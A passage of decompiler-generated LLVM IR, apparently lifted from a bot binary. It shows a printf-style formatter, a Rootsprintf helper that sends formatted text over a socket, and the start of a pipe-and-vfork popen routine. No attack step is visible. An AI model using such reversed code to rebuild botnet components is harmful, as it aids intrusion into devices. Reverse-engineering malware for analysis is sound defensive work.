  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_10000a7c ], [ 1, %dec_label_pc_10000a90 ]
  %v4_10000ac03 = ptrtoint i8* %stack_var_-68.0.ph to i32
  %v2_10000ac44 = load i8, i8* %stack_var_-68.0.ph, align 1
  %v3_10000acc8 = icmp eq i8 %v2_10000ac44, 48
  br i1 %v3_10000acc8, label %dec_label_pc_10000aa8, label %dec_label_pc_10000b0c.preheader

dec_label_pc_10000aa8:                            ; preds = %dec_label_pc_10000ac0.preheader, %dec_label_pc_10000aa8
  %v4_10000ac010 = phi i32 [ %v1_10000aac, %dec_label_pc_10000aa8 ], [ %v4_10000ac03, %dec_label_pc_10000ac0.preheader ]
  %stack_var_-52.09 = phi i32 [ %v1_10000ab8, %dec_label_pc_10000aa8 ], [ %stack_var_-52.0.ph, %dec_label_pc_10000ac0.preheader ]
  %v1_10000aac = add i32 %v4_10000ac010, 1
  %v5_10000ab0 = inttoptr i32 %v1_10000aac to i8*
  %v1_10000ab8 = or i32 %stack_var_-52.09, 2
  %v2_10000ac4 = load i8, i8* %v5_10000ab0, align 1
  %v3_10000acc = icmp eq i8 %v2_10000ac4, 48
  br i1 %v3_10000acc, label %dec_label_pc_10000aa8, label %dec_label_pc_10000b0c.preheader

dec_label_pc_10000b0c.preheader:                  ; preds = %dec_label_pc_10000aa8, %dec_label_pc_10000ac0.preheader
  %stack_var_-52.0.lcssa = phi i32 [ %stack_var_-52.0.ph, %dec_label_pc_10000ac0.preheader ], [ %v1_10000ab8, %dec_label_pc_10000aa8 ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.0.ph, %dec_label_pc_10000ac0.preheader ], [ %v5_10000ab0, %dec_label_pc_10000aa8 ]
  %v4_10000b0c12 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v2_10000b1013 = load i8, i8* %stack_var_-68.0.lcssa, align 1
  %tmp62 = icmp ult i8 %v2_10000b1013, 48
  br i1 %tmp62, label %dec_label_pc_10000b34, label %dec_label_pc_10000b20

dec_label_pc_10000ad8:                            ; preds = %dec_label_pc_10000b20
  %v1_10000adc = mul i32 %stack_var_-48.018, 10
  %v2_10000ae8 = load i8, i8* %stack_var_-68.119, align 1
  %v3_10000ae8 = zext i8 %v2_10000ae8 to i32
  %v2_10000af4 = add i32 %v1_10000adc, -48
  %v1_10000af8 = add i32 %v2_10000af4, %v3_10000ae8
  %v1_10000b04 = add i32 %v4_10000b0c20, 1
  %v5_10000b08 = inttoptr i32 %v1_10000b04 to i8*
  %v2_10000b10 = load i8, i8* %v5_10000b08, align 1
  %tmp63 = icmp ult i8 %v2_10000b10, 48
  br i1 %tmp63, label %dec_label_pc_10000b34, label %dec_label_pc_10000b20

dec_label_pc_10000b20:                            ; preds = %dec_label_pc_10000b0c.preheader, %dec_label_pc_10000ad8
  %v4_10000b0c20 = phi i32 [ %v1_10000b04, %dec_label_pc_10000ad8 ], [ %v4_10000b0c12, %dec_label_pc_10000b0c.preheader ]
  %stack_var_-68.119 = phi i8* [ %v5_10000b08, %dec_label_pc_10000ad8 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_10000b0c.preheader ]
  %stack_var_-48.018 = phi i32 [ %v1_10000af8, %dec_label_pc_10000ad8 ], [ 0, %dec_label_pc_10000b0c.preheader ]
  %v2_10000b24 = load i8, i8* %stack_var_-68.119, align 1
  %tmp64 = icmp ult i8 %v2_10000b24, 58
  br i1 %tmp64, label %dec_label_pc_10000ad8, label %dec_label_pc_10000b34

dec_label_pc_10000b34:                            ; preds = %dec_label_pc_10000ad8, %dec_label_pc_10000b20, %dec_label_pc_10000b0c.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_10000b0c.preheader ], [ %v1_10000af8, %dec_label_pc_10000ad8 ], [ %stack_var_-48.018, %dec_label_pc_10000b20 ]
  %stack_var_-68.1.lcssa = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_10000b0c.preheader ], [ %v5_10000b08, %dec_label_pc_10000ad8 ], [ %stack_var_-68.119, %dec_label_pc_10000b20 ]
  %v2_10000b38 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000b40 = icmp eq i8 %v2_10000b38, 115
  br i1 %v3_10000b40, label %dec_label_pc_10000b48, label %dec_label_pc_10000c08

dec_label_pc_10000b48:                            ; preds = %dec_label_pc_10000b34
  %v2_10000b4c = load i8, i8* %tmp, align 1
  %tmp65 = icmp ugt i8 %v2_10000b4c, 7
  br i1 %tmp65, label %dec_label_pc_10000b94, label %dec_label_pc_10000b5c

dec_label_pc_10000b5c:                            ; preds = %dec_label_pc_10000b48
  %v3_10000b60 = load i32, i32* %v2_10000b60, align 4
  %v2_10000b68 = load i8, i8* %tmp, align 1
  %v3_10000b68 = zext i8 %v2_10000b68 to i32
  %v1_10000b74 = mul nuw nsw i32 %v3_10000b68, 4
  %v2_10000b78 = add i32 %v1_10000b74, %v3_10000b60
  %v1_10000b80 = add i8 %v2_10000b68, 1
  store i8 %v1_10000b80, i8* %tmp, align 1
  br label %dec_label_pc_10000bac

dec_label_pc_10000b94:                            ; preds = %dec_label_pc_10000b48
  %v3_10000b98 = load i32, i32* %v2_10000b98, align 4
  %v1_10000ba0 = add i32 %v3_10000b98, 4
  store i32 %v1_10000ba0, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000bac

dec_label_pc_10000bac:                            ; preds = %dec_label_pc_10000b5c, %dec_label_pc_10000b94
  %stack_var_-20.0 = phi i32 [ %v3_10000b98, %dec_label_pc_10000b94 ], [ %v2_10000b78, %dec_label_pc_10000b5c ]
  %v1_10000bb0 = inttoptr i32 %stack_var_-20.0 to i32*
  %v2_10000bb0 = load i32, i32* %v1_10000bb0, align 4
  %v3_10000bbc = icmp eq i32 %v2_10000bb0, 0
  br i1 %v3_10000bbc, label %dec_label_pc_10000bd0, label %dec_label_pc_10000bc4

dec_label_pc_10000bc4:                            ; preds = %dec_label_pc_10000bac
  %v5_10000bc8 = inttoptr i32 %v2_10000bb0 to i8*
  br label %dec_label_pc_10000bdc

dec_label_pc_10000bd0:                            ; preds = %dec_label_pc_10000bac
  br label %dec_label_pc_10000bdc

dec_label_pc_10000bdc:                            ; preds = %dec_label_pc_10000bc4, %dec_label_pc_10000bd0
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10011840.15, i32 0, i32 0), %dec_label_pc_10000bd0 ], [ %v5_10000bc8, %dec_label_pc_10000bc4 ]
  %v6_10000bf0 = call i32 @prints(i32 %tmp41, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10000bfc = add i32 %v6_10000bf0, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000c08:                            ; preds = %dec_label_pc_10000b34
  %v2_10000c0c = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000c14 = icmp eq i8 %v2_10000c0c, 100
  br i1 %v3_10000c14, label %dec_label_pc_10000c1c, label %dec_label_pc_10000cbc

dec_label_pc_10000c1c:                            ; preds = %dec_label_pc_10000c08
  %v2_10000c20 = load i8, i8* %tmp, align 1
  %tmp66 = icmp ugt i8 %v2_10000c20, 7
  br i1 %tmp66, label %dec_label_pc_10000c68, label %dec_label_pc_10000c30

dec_label_pc_10000c30:                            ; preds = %dec_label_pc_10000c1c
  %v3_10000c34 = load i32, i32* %v2_10000b60, align 4
  %v2_10000c3c = load i8, i8* %tmp, align 1
  %v3_10000c3c = zext i8 %v2_10000c3c to i32
  %v1_10000c48 = mul nuw nsw i32 %v3_10000c3c, 4
  %v2_10000c4c = add i32 %v1_10000c48, %v3_10000c34
  %v1_10000c54 = add i8 %v2_10000c3c, 1
  store i8 %v1_10000c54, i8* %tmp, align 1
  br label %dec_label_pc_10000c80

dec_label_pc_10000c68:                            ; preds = %dec_label_pc_10000c1c
  %v3_10000c6c = load i32, i32* %v2_10000b98, align 4
  %v1_10000c74 = add i32 %v3_10000c6c, 4
  store i32 %v1_10000c74, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000c80

dec_label_pc_10000c80:                            ; preds = %dec_label_pc_10000c30, %dec_label_pc_10000c68
  %stack_var_-28.0 = phi i32 [ %v3_10000c6c, %dec_label_pc_10000c68 ], [ %v2_10000c4c, %dec_label_pc_10000c30 ]
  %v1_10000c84 = inttoptr i32 %stack_var_-28.0 to i32*
  %v2_10000c84 = load i32, i32* %v1_10000c84, align 4
  %v7_10000ca4 = call i32 @printi(i32 %tmp41, i32 %v2_10000c84, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000cb0 = add i32 %v7_10000ca4, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000cbc:                            ; preds = %dec_label_pc_10000c08
  %v2_10000cc0 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000cc8 = icmp eq i8 %v2_10000cc0, 120
  br i1 %v3_10000cc8, label %dec_label_pc_10000cd0, label %dec_label_pc_10000d70

dec_label_pc_10000cd0:                            ; preds = %dec_label_pc_10000cbc
  %v2_10000cd4 = load i8, i8* %tmp, align 1
  %tmp67 = icmp ugt i8 %v2_10000cd4, 7
  br i1 %tmp67, label %dec_label_pc_10000d1c, label %dec_label_pc_10000ce4

dec_label_pc_10000ce4:                            ; preds = %dec_label_pc_10000cd0
  %v3_10000ce8 = load i32, i32* %v2_10000b60, align 4
  %v2_10000cf0 = load i8, i8* %tmp, align 1
  %v3_10000cf0 = zext i8 %v2_10000cf0 to i32
  %v1_10000cfc = mul nuw nsw i32 %v3_10000cf0, 4
  %v2_10000d00 = add i32 %v1_10000cfc, %v3_10000ce8
  %v1_10000d08 = add i8 %v2_10000cf0, 1
  store i8 %v1_10000d08, i8* %tmp, align 1
  br label %dec_label_pc_10000d34

dec_label_pc_10000d1c:                            ; preds = %dec_label_pc_10000cd0
  %v3_10000d20 = load i32, i32* %v2_10000b98, align 4
  %v1_10000d28 = add i32 %v3_10000d20, 4
  store i32 %v1_10000d28, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000d34

dec_label_pc_10000d34:                            ; preds = %dec_label_pc_10000ce4, %dec_label_pc_10000d1c
  %stack_var_-32.0 = phi i32 [ %v3_10000d20, %dec_label_pc_10000d1c ], [ %v2_10000d00, %dec_label_pc_10000ce4 ]
  %v1_10000d38 = inttoptr i32 %stack_var_-32.0 to i32*
  %v2_10000d38 = load i32, i32* %v1_10000d38, align 4
  %v7_10000d58 = call i32 @printi(i32 %tmp41, i32 %v2_10000d38, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000d64 = add i32 %v7_10000d58, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000d70:                            ; preds = %dec_label_pc_10000cbc
  %v2_10000d74 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000d7c = icmp eq i8 %v2_10000d74, 88
  br i1 %v3_10000d7c, label %dec_label_pc_10000d84, label %dec_label_pc_10000e24

dec_label_pc_10000d84:                            ; preds = %dec_label_pc_10000d70
  %v2_10000d88 = load i8, i8* %tmp, align 1
  %tmp68 = icmp ugt i8 %v2_10000d88, 7
  br i1 %tmp68, label %dec_label_pc_10000dd0, label %dec_label_pc_10000d98

dec_label_pc_10000d98:                            ; preds = %dec_label_pc_10000d84
  %v3_10000d9c = load i32, i32* %v2_10000b60, align 4
  %v2_10000da4 = load i8, i8* %tmp, align 1
  %v3_10000da4 = zext i8 %v2_10000da4 to i32
  %v1_10000db0 = mul nuw nsw i32 %v3_10000da4, 4
  %v2_10000db4 = add i32 %v1_10000db0, %v3_10000d9c
  %v1_10000dbc = add i8 %v2_10000da4, 1
  store i8 %v1_10000dbc, i8* %tmp, align 1
  br label %dec_label_pc_10000de8

dec_label_pc_10000dd0:                            ; preds = %dec_label_pc_10000d84
  %v3_10000dd4 = load i32, i32* %v2_10000b98, align 4
  %v1_10000ddc = add i32 %v3_10000dd4, 4
  store i32 %v1_10000ddc, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000de8

dec_label_pc_10000de8:                            ; preds = %dec_label_pc_10000d98, %dec_label_pc_10000dd0
  %stack_var_-36.0 = phi i32 [ %v3_10000dd4, %dec_label_pc_10000dd0 ], [ %v2_10000db4, %dec_label_pc_10000d98 ]
  %v1_10000dec = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_10000dec = load i32, i32* %v1_10000dec, align 4
  %v7_10000e0c = call i32 @printi(i32 %tmp41, i32 %v2_10000dec, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 65)
  %v2_10000e18 = add i32 %v7_10000e0c, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000e24:                            ; preds = %dec_label_pc_10000d70
  %v2_10000e28 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000e30 = icmp eq i8 %v2_10000e28, 117
  br i1 %v3_10000e30, label %dec_label_pc_10000e38, label %dec_label_pc_10000ed8

dec_label_pc_10000e38:                            ; preds = %dec_label_pc_10000e24
  %v2_10000e3c = load i8, i8* %tmp, align 1
  %tmp69 = icmp ugt i8 %v2_10000e3c, 7
  br i1 %tmp69, label %dec_label_pc_10000e84, label %dec_label_pc_10000e4c

dec_label_pc_10000e4c:                            ; preds = %dec_label_pc_10000e38
  %v3_10000e50 = load i32, i32* %v2_10000b60, align 4
  %v2_10000e58 = load i8, i8* %tmp, align 1
  %v3_10000e58 = zext i8 %v2_10000e58 to i32
  %v1_10000e64 = mul nuw nsw i32 %v3_10000e58, 4
  %v2_10000e68 = add i32 %v1_10000e64, %v3_10000e50
  %v1_10000e70 = add i8 %v2_10000e58, 1
  store i8 %v1_10000e70, i8* %tmp, align 1
  br label %dec_label_pc_10000e9c

dec_label_pc_10000e84:                            ; preds = %dec_label_pc_10000e38
  %v3_10000e88 = load i32, i32* %v2_10000b98, align 4
  %v1_10000e90 = add i32 %v3_10000e88, 4
  store i32 %v1_10000e90, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000e9c

dec_label_pc_10000e9c:                            ; preds = %dec_label_pc_10000e4c, %dec_label_pc_10000e84
  %stack_var_-40.0 = phi i32 [ %v3_10000e88, %dec_label_pc_10000e84 ], [ %v2_10000e68, %dec_label_pc_10000e4c ]
  %v1_10000ea0 = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_10000ea0 = load i32, i32* %v1_10000ea0, align 4
  %v7_10000ec0 = call i32 @printi(i32 %tmp41, i32 %v2_10000ea0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000ecc = add i32 %v7_10000ec0, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000ed8:                            ; preds = %dec_label_pc_10000e24
  %v2_10000edc = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000ee4 = icmp eq i8 %v2_10000edc, 99
  br i1 %v3_10000ee4, label %dec_label_pc_10000eec, label %dec_label_pc_10000fb8

dec_label_pc_10000eec:                            ; preds = %dec_label_pc_10000ed8
  %v2_10000ef0 = load i8, i8* %tmp, align 1
  %tmp70 = icmp ugt i8 %v2_10000ef0, 7
  br i1 %tmp70, label %dec_label_pc_10000f38, label %dec_label_pc_10000f00

dec_label_pc_10000f00:                            ; preds = %dec_label_pc_10000eec
  %v3_10000f04 = load i32, i32* %v2_10000b60, align 4
  %v2_10000f0c = load i8, i8* %tmp, align 1
  %v3_10000f0c = zext i8 %v2_10000f0c to i32
  %v1_10000f18 = mul nuw nsw i32 %v3_10000f0c, 4
  %v2_10000f1c = add i32 %v1_10000f18, %v3_10000f04
  %v1_10000f24 = add i8 %v2_10000f0c, 1
  store i8 %v1_10000f24, i8* %tmp, align 1
  br label %dec_label_pc_10000f50

dec_label_pc_10000f38:                            ; preds = %dec_label_pc_10000eec
  %v3_10000f3c = load i32, i32* %v2_10000b98, align 4
  %v1_10000f44 = add i32 %v3_10000f3c, 4
  store i32 %v1_10000f44, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000f50

dec_label_pc_10000f50:                            ; preds = %dec_label_pc_10000f00, %dec_label_pc_10000f38
  %stack_var_-44.0 = phi i32 [ %v3_10000f3c, %dec_label_pc_10000f38 ], [ %v2_10000f1c, %dec_label_pc_10000f00 ]
  %v1_10000f54 = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_10000f54 = load i32, i32* %v1_10000f54, align 4
  %v1_10000f58 = urem i32 %v2_10000f54, 256
  store i32 %v1_10000f58, i32* %stack_var_-88, align 4
  %v5_10000f7c = call i32 @prints(i32 %tmp41, i8* %v4_10000f7c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10000f88 = add i32 %v5_10000f7c, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000f94:                            ; preds = %dec_label_pc_10000a24, %dec_label_pc_10000a68
  %stack_var_-68.2 = phi i8* [ %v5_10000a40, %dec_label_pc_10000a68 ], [ %stack_var_-68.434, %dec_label_pc_10000a24 ]
  %v2_10000f98 = load i8, i8* %stack_var_-68.2, align 1
  %v3_10000f98 = zext i8 %v2_10000f98 to i32
  %v3_10000fa8 = call i32 @printchar(i32* %arg1, i32 %v3_10000f98)
  %v1_10000fb0 = add i32 %stack_var_-56.132, 1
  br label %dec_label_pc_10000fb8

dec_label_pc_10000fb8:                            ; preds = %dec_label_pc_10000ed8, %dec_label_pc_10000f50, %dec_label_pc_10000e9c, %dec_label_pc_10000de8, %dec_label_pc_10000d34, %dec_label_pc_10000c80, %dec_label_pc_10000bdc, %dec_label_pc_10000f94
  %stack_var_-56.0 = phi i32 [ %v1_10000fb0, %dec_label_pc_10000f94 ], [ %v2_10000bfc, %dec_label_pc_10000bdc ], [ %v2_10000cb0, %dec_label_pc_10000c80 ], [ %v2_10000d64, %dec_label_pc_10000d34 ], [ %v2_10000e18, %dec_label_pc_10000de8 ], [ %v2_10000ecc, %dec_label_pc_10000e9c ], [ %v2_10000f88, %dec_label_pc_10000f50 ], [ %stack_var_-56.132, %dec_label_pc_10000ed8 ]
  %stack_var_-68.3 = phi i8* [ %stack_var_-68.2, %dec_label_pc_10000f94 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000bdc ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000c80 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000d34 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000de8 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000e9c ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000f50 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000ed8 ]
  %v4_10000fb8 = ptrtoint i8* %stack_var_-68.3 to i32
  %v1_10000fbc = add i32 %v4_10000fb8, 1
  %stack_var_-68.4 = inttoptr i32 %v1_10000fbc to i8*
  %v2_10000fc8 = load i8, i8* %stack_var_-68.4, align 1
  %v3_10000fd0 = icmp eq i8 %v2_10000fc8, 0
  br i1 %v3_10000fd0, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a24

dec_label_pc_10000fd8:                            ; preds = %dec_label_pc_10000a38, %dec_label_pc_10000fb8, %entry
  %stack_var_-56.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-56.132, %dec_label_pc_10000a38 ], [ %stack_var_-56.0, %dec_label_pc_10000fb8 ]
  %v3_10000fdc = icmp eq i32* %arg1, null
  br i1 %v3_10000fdc, label %dec_label_pc_10000ff4, label %dec_label_pc_10000fe4

dec_label_pc_10000fe4:                            ; preds = %dec_label_pc_10000fd8
  %v2_10000fe8 = load i32, i32* %arg1, align 4
  %v3_10000ff0 = inttoptr i32 %v2_10000fe8 to i8*
  store i8 0, i8* %v3_10000ff0, align 1
  br label %dec_label_pc_10000ff4

dec_label_pc_10000ff4:                            ; preds = %dec_label_pc_10000fd8, %dec_label_pc_10000fe4
  ret i32 %stack_var_-56.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-68.4, { 1, 0 }
  uselistorder i8* %stack_var_-68.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-68.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10000aac, { 1, 0 }
  uselistorder i32 %stack_var_-52.0.ph, { 1, 0 }
  uselistorder i8* %v5_10000a40, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-56.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-68.4.in33, { 1, 0 }
  uselistorder i32* %v2_10000b98, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10000ff4, { 1, 0 }
  uselistorder label %dec_label_pc_10000fd8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000fb8, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_10000f94, { 1, 0 }
  uselistorder label %dec_label_pc_10000f50, { 1, 0 }
  uselistorder label %dec_label_pc_10000e9c, { 1, 0 }
  uselistorder label %dec_label_pc_10000de8, { 1, 0 }
  uselistorder label %dec_label_pc_10000d34, { 1, 0 }
  uselistorder label %dec_label_pc_10000c80, { 1, 0 }
  uselistorder label %dec_label_pc_10000bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10000bac, { 1, 0 }
  uselistorder label %dec_label_pc_10000b34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000b20, { 1, 0 }
  uselistorder label %dec_label_pc_10000aa8, { 1, 0 }
  uselistorder label %dec_label_pc_10000a24, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  store i32 1, i32* %stack_var_-136, align 4
  %v2_10001094 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268439712, i32* @lr, align 4
  %v4_1000109c = call i32 @print(i32* null, i32 %arg1, i32 %v2_10001094)
  ret i32 %v4_1000109c

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-120, align 4
  store i32 2, i32* %stack_var_-136, align 4
  %v2_10001144 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268439888, i32* @lr, align 4
  %v4_1000114c = call i32 @print(i32* nonnull %stack_var_-120, i32 %arg2, i32 %v2_10001144)
  ret i32 %v4_1000114c

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @Rootsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 2048, i32* @r3, align 4
  store i32 268440016, i32* @lr, align 4
  %v0_100011cc = call i32 @malloc()
  store i32 %v0_100011cc, i32* %stack_var_-144, align 4
  store i32 268440048, i32* @lr, align 4
  %v3_100011ec = call i32 @__GI_memset(i32 %v0_100011cc, i32 0, i32 2048)
  store i32 2, i32* %stack_var_-140, align 4
  %v2_10001220 = ptrtoint i32* %stack_var_-140 to i32
  store i32 268440116, i32* @lr, align 4
  %v4_10001230 = call i32 @print(i32* nonnull %stack_var_-144, i32 %arg2, i32 %v2_10001220)
  store i32 %v0_100011cc, i32* @r3, align 4
  %v0_10001238 = call i32 @__GI_strlen()
  %v2_10001248 = add i32 %v0_10001238, %v0_100011cc
  %v3_10001250 = inttoptr i32 %v2_10001248 to i8*
  store i8 10, i8* %v3_10001250, align 1
  store i32 %v0_100011cc, i32* @r3, align 4
  %v0_10001258 = call i32 @__GI_strlen()
  store i32 268440180, i32* @lr, align 4
  %v4_10001270 = call i32 @__libc_send(i32 %arg1, i32 %v0_100011cc, i32 %v0_10001258, i32 16384)
  store i32 %v0_100011cc, i32* @r3, align 4
  store i32 268440196, i32* @lr, align 4
  %v0_10001280 = call i32 @free()
  ret i32 %v4_10001270

; uselistorder directives
  uselistorder i32 %v0_100011cc, { 1, 4, 2, 0, 3, 5, 6 }
  uselistorder i32* %stack_var_-140, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %v2_100012c4 = load i8, i8* %arg2, align 1
  %v3_100012cc = icmp eq i8 %v2_100012c4, 114
  br i1 %v3_100012cc, label %dec_label_pc_100012e8, label %dec_label_pc_100012d4

dec_label_pc_100012d4:                            ; preds = %entry
  %v2_100012d8 = load i8, i8* %arg2, align 1
  %v3_100012e0 = icmp eq i8 %v2_100012d8, 119
  br i1 %v3_100012e0, label %dec_label_pc_100012e8, label %dec_label_pc_10001300

dec_label_pc_100012e8:                            ; preds = %dec_label_pc_100012d4, %entry
  %v1_100012ec = add i32 %tmp, 1
  %v2_100012ec = inttoptr i32 %v1_100012ec to i8*
  %v3_100012f0 = load i8, i8* %v2_100012ec, align 1
  %v3_100012f8 = icmp eq i8 %v3_100012f0, 0
  br i1 %v3_100012f8, label %dec_label_pc_1000130c, label %dec_label_pc_10001300

dec_label_pc_10001300:                            ; preds = %dec_label_pc_100012d4, %dec_label_pc_100012e8
  br label %dec_label_pc_10001530

dec_label_pc_1000130c:                            ; preds = %dec_label_pc_100012e8
  %v2_1000130c = ptrtoint i32* %stack_var_-48 to i32
  store i32 268440344, i32* @lr, align 4
  %v3_10001314 = call i32 @__GI_pipe(i32 %v2_1000130c, i32 %v1_100012ec)
  store i32 %v3_10001314, i32* @r3, align 4
  %tmp15 = icmp sgt i32 %v3_10001314, -1
  br i1 %tmp15, label %dec_label_pc_10001330, label %dec_label_pc_10001324

dec_label_pc_10001324:                            ; preds = %dec_label_pc_1000130c
  br label %dec_label_pc_10001530

dec_label_pc_10001330:                            ; preds = %dec_label_pc_1000130c
  %v3_10001334 = load i32, i32* @global_var_10024a44.16, align 4
  %v3_10001338 = icmp eq i32 %v3_10001334, 0
  br i1 %v3_10001338, label %dec_label_pc_10001340, label %dec_label_pc_100013c0

dec_label_pc_10001340:                            ; preds = %dec_label_pc_10001330
  store i32 268440388, i32* @lr, align 4
  %v1_10001340 = call i32 @getdtablesize(i32 268566528)
  %v2_10001350 = icmp sgt i32 %v1_10001340, 0
  br i1 %v2_10001350, label %dec_label_pc_10001364, label %dec_label_pc_10001358

dec_label_pc_10001358:                            ; preds = %dec_label_pc_10001340
  br label %dec_label_pc_10001530

dec_label_pc_10001364:                            ; preds = %dec_label_pc_10001340
  %v1_10001368 = mul i32 %v1_10001340, 4
  store i32 %v1_10001368, i32* @r3, align 4
  store i32 268440436, i32* @lr, align 4
  %v0_10001370 = call i32 @malloc()
  store i32 %v0_10001370, i32* @global_var_10024a44.16, align 4
  %v3_10001388 = icmp eq i32 %v0_10001370, 0
  br i1 %v3_10001388, label %dec_label_pc_10001390, label %dec_label_pc_1000139c

dec_label_pc_10001390:                            ; preds = %dec_label_pc_10001364
  br label %dec_label_pc_10001530

dec_label_pc_1000139c:                            ; preds = %dec_label_pc_10001364
  store i32 ptrtoint (i32* @global_var_100013c0.17 to i32), i32* @lr, align 4
  %v3_100013bc = call i32 @__GI_memset(i32 %v0_10001370, i32 0, i32 %v1_10001368)
  store i32 %v3_100013bc, i32* @r3, align 4
  br label %dec_label_pc_100013c0

dec_label_pc_100013c0:                            ; preds = %dec_label_pc_10001330, %dec_label_pc_1000139c
  store i32 268440516, i32* @lr, align 4
  %v0_100013c0 = call i32 @__vfork()
  %v4_100013dc = icmp eq i32 %v0_100013c0, -1
  br i1 %v4_100013dc, label %dec_label_pc_100013f4, label %dec_label_pc_100013e4

dec_label_pc_100013e4:                            ; preds = %dec_label_pc_100013c0
  %v3_100013e8 = icmp eq i32 %v0_100013c0, 0
  br i1 %v3_100013e8, label %dec_label_pc_10001418, label %dec_label_pc_100014c8

dec_label_pc_100013f4:                            ; preds = %dec_label_pc_100013c0
  %v3_100013f4 = load i32, i32* %stack_var_-48, align 4
  store i32 268440576, i32* @lr, align 4
  %v1_100013fc = call i32 @__libc_close(i32 %v3_100013f4)
  store i32 ptrtoint (i32* @global_var_1000140c.18 to i32), i32* @lr, align 4
  %v1_10001408 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001530

dec_label_pc_10001418:                            ; preds = %dec_label_pc_100013e4
  %v3_1000141c = load i8, i8* %arg2, align 1
  %v3_10001424 = icmp eq i8 %v3_1000141c, 114
  br i1 %v3_10001424, label %dec_label_pc_1000142c, label %dec_label_pc_10001464

dec_label_pc_1000142c:                            ; preds = %dec_label_pc_10001418
  %v3_10001430 = icmp eq i32 %tmp3, 1
  br i1 %v3_10001430, label %dec_label_pc_10001454, label %dec_label_pc_10001438

dec_label_pc_10001438:                            ; preds = %dec_label_pc_1000142c
  store i32 268440648, i32* @lr, align 4
